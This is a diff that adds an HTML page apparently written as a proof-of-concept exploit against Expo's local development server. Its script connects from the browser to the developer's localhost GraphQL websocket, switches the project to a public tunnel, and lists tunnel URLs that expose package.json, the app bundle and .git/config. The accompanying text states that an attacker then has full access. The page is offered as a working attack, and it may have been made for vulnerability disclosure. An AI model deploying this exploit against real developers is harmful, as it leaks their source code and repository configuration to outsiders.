@@ -1,0 +1,51 @@
+<head>
+  <meta http-equiv="Content-Security-Policy"
+    content="default-src *; style-src 'self' http://* 'unsafe-inline'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'" />
+  <meta name="robots" content="noindex">
+  <script src="//unpkg.com/subscriptions-transport-ws@0.5.4/browser/client.js"></script>
+</head>
+
+<body>
+  <a href="../">Home</a><br>
+  Opening tunnel that will give access to GET and POST request directly<br>
+  You can open any file in subfolders from where `expo start` was run by replacing `package.json` with the file you want<br>
+  Once the tunnel is open an attacker does not need to run any more code in browser. They just need the tunnel url and they
+  have full access to web socks and http requests.
+  <ul id="mainList"></ul>
+  <script>
+    (async () => {
+      const client = new window.SubscriptionsTransportWs.SubscriptionClient(`ws://localhost:19002/graphql`, {
+        //   reconnect: true
+      });
+      client.subscriptions["1"] = {
+        handler: (err,data) => {
+          const baseUrl = data.setProjectSettings.manifestUrl.replace("exp://","").replace(":80","");
+          let item = document.createElement("li");
+          let urlString = `http://packager.${baseUrl}/package.json`;
+          item.innerHTML = `package.json: <a href="${urlString}">${urlString}</a>`;
+          document.getElementById("mainList").appendChild(item);
+          item = document.createElement("li");
+          urlString = `http://packager.${baseUrl}/node_modules/expo/AppEntry.bundle?platform=ios&dev=true&minify=false&hot=false`;
+          item.innerHTML = `Javascript bundle: <a href="${urlString}">${urlString}</a>`;
+          document.getElementById("mainList").appendChild(item);
+          item = document.createElement("li");
+          urlString = `http://packager.${baseUrl}/.git/config`;
+          item.innerHTML = `Git config: <a href="${urlString}">${urlString}</a>`;
+          document.getElementById("mainList").appendChild(item);
+          console.log(data);
+        }
+      };
+      client.sendMessage({
+        "id": "1",
+        "type": "start",
+        "payload": {
+          "query": "mutation SetHostType($hostType: HostType!) {\n  setProjectSettings(settings: {hostType: $hostType}) {\n    id\n    manifestUrl\n    settings {\n      hostType\n      __typename\n    }\n    __typename\n  }\n}\n",
+          "variables": {
+            "hostType": "tunnel"
+          },
+          "operationName": "SetHostType"
+        }
+      });
+    })();
+  </script>
+</body>
